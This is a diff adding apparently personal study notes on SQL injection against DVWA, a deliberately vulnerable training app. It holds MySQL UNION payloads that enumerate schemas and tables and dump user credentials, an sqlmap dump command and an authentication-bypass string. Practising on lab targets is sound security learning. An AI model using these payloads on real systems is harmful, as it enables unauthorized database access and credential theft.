@@ -1,0 +1,28 @@
+SQL INJECTION
+find a user input that communicates with database
+usually; username and password form or page to search for product
+
+theres always 2 single strings, if a string is added it should throw an error to show sql vuln is available
+ -- = comment, must be added at the end of query to prevent error
+to check for sql
+type specialchar to increase character in default query
+SELECT name,surname FROM table where ID = ''
+
+MYSQL
+
+2' and '1'='1
+2' order by 1 -- ' === order by 1 checks if theres column
+2' union select 1,2 -- ' === print columns
+2' union select database(),user() -- ' == print database
+
+to extract database
+2' union select schema_name, 2 from information_schema.schemata -- '
+
+2' union select table_name, 2 from information_schema.tables where table_schema = 'dvwa' -- '
+
+2' union select column_name, column_type from information_schema.columns where table_schema = 'dvwa' and table_name ='users' -- '
+
+2' union select concat(user_id,':',first_name,':',last_name), concat(user,':',password) from dvwa.users -- '
+
+sqlmap -r file --dbs --dump --thread 10
+'union select 'random' as password'
